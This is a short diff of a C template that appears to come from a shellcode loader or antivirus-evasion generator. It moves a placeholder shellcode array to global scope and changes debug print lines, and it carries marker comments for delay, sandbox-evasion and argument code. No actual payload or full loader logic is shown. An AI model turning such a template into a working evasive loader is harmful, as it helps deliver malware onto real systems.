@@ -10,14 +10,15 @@
 
 //####CODE####
 
+const unsigned char raw[####SHELLCODE_LEN####] = ####SHELLCODE####;
+int length = ####SHELLCODE_LEN####;
 
 DWORD WINAPI esc_main(LPVOID lpParameter)
 {
     DWORD dwSize;
     bool success = false;
-    
-    const unsigned char raw[####SHELLCODE_LEN####] = ####SHELLCODE####;;
-    int length = ####SHELLCODE_LEN####;
+    printf("\n[-] LALALA from inside");
+
     
     printf("[-] length is %d !\n", length);
 
@@ -55,7 +56,7 @@ DWORD WINAPI esc_main(LPVOID lpParameter)
 
 int main()
 {
-    printf("[-] LALALA");
+    printf("\n[-] LALALA");
     //####DELAY####
     //####SANDBOXEVASION####
     //####ARGS####
